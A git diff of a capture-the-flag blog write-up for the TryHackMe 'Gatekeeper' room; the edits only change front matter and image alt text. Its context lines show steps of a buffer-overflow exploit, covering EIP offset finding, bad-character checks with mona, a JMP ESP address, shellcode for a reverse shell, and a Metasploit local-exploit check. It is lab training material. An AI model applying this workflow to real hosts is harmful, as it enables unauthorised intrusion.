@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Box - Gatekeeper
 published: true
 ---
@@ -8,7 +8,7 @@ Can you get past the gate and through the fire?
 
 [https://tryhackme.com/room/gatekeeper](https://tryhackme.com/room/gatekeeper)
 
-![](/assets/balrog.jpg)
+![0xskar](/assets/balrog.jpg)
 
 * * *
 
@@ -40,22 +40,22 @@ Defeat the Gatekeeper to break the chains.  But beware, fire awaits on the other
 - Check share directory for gatekeeper.exe and get it over to windows 7 vm to see if we can overflow
 - lets set mona working folder in immunity as well ``!mona config -set workingfolder c:\mona\%p``
 
-![](/assets/gatekeeper01.png)
+![0xskar](/assets/gatekeeper01.png)
 
 - Send through 5000 a's and see if we can overwrite the EIP register
 - lets run our a.py ``print ("A" *5000)`` and send through the A's via netcat
 
-![](/assets/gatekeeper02.png)
+![0xskar](/assets/gatekeeper02.png)
 
 - Now lets find our offset.
 
 - ``msf-pattern_create -l 5000`` and send in netcat and note the EIP "39654138"
 
-![](/assets/gatekeeper03.png)
+![0xskar](/assets/gatekeeper03.png)
 
 - ``msf-pattern_offset -l 5000 -q 39654138`` and look for an exact match offset 
 
-![](/assets/gatekeeper04.png)
+![0xskar](/assets/gatekeeper04.png)
 
 - Since we have an exact offset at 146 lets edit our code to send payloads so we can look for badchars.
 
@@ -79,7 +79,7 @@ except:
       sys.exit()
 ```
 
-![](/assets/gatekeeper05.png)
+![0xskar](/assets/gatekeeper05.png)
 
 - we control the EIP since we have overwritten with our B's 42424242
 
@@ -130,7 +130,7 @@ except:
 - in Moma lets run the memory comparison
 - ``!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 015619F8``
 
-![](/assets/gatekeeper07.png)
+![0xskar](/assets/gatekeeper07.png)
 
 - We can gerate a new bytearray in mona, with the badchars and then update our payload and send it though again hopyfully returning Unmodified.
 - ``!mona bytearray -b "\x00\x0a"``
@@ -175,12 +175,12 @@ except:
 
 - ``!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 014C19F8``
 
-![](/assets/gatekeeper08.png)
+![0xskar](/assets/gatekeeper08.png)
 
 - Now we can find a jump point with our identified badchars
 - ``!mona jmp -r esp -cpb "\x00\x0a"``
 
-![](/assets/gatekeeper09.png)
+![0xskar](/assets/gatekeeper09.png)
 
 - 080414C3 Jump Point
 - Now that we have this jump point we can update our code and generate our shellcode
@@ -235,7 +235,7 @@ except:
 
 - send once more for reverse shell hopefully
 
-![](/gatekeeper10.png)
+![0xskar](/assets/gatekeeper10.png)
 
 - now we can update the exploit with new msfvenom output with openvpn ip and run it against our target
 
@@ -285,7 +285,7 @@ except:
       sys.exit()
 ```
 
-![](/assets/gatekeeper11.png)
+![0xskar](/assets/gatekeeper11.png)
 
 ## # Exploits
 
@@ -296,7 +296,7 @@ except:
 
 **Locate and find the User Flag.**
 
-![](/assets/gatekeeper12.png)
+![0xskar](/assets/gatekeeper12.png)
 
 **Locate and find the Root Flag**
 
@@ -315,7 +315,7 @@ System Type:               x64-based PC
 - ``msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester``
 - ``[+] 10.10.136.143 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.``
 
-![](/assets/gatekeeper13.png)
+![0xskar](/assets/gatekeeper13.png)
 
 * * *
 
